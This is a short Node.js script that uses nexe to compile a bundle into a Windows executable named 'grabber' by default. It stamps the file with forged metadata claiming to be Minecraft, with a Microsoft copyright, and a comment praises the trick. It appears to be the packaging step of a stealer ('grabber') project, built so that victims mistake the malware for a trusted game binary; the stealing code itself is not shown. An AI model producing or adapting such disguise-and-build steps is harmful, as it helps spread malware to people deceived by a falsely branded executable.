const { compile } = require('nexe');

compile({
  input: './dist/index.bundle.js',
  output: (require('./config').filename || 'grabber') + '.exe',
  build: true,
  resources: ['./dist/*.bundle.js', './dist/*.exe'],
  ico: './icon.ico',
  rc: { // This is one of the best things that exists
    CompanyName: 'Minecraft',
    ProductVersion: '1.19.60.03',
    FileVersion: '1.19.60.3',
    LegalCopyright: '© Microsoft. All rights reserved.',
    OriginalFilename: 'Minecraft',
    FileDescription: 'Minecraft',
    ProductName: 'Minecraft'
  },
  verbose: true,
  target: ['win32-x64-18.16.0']
});
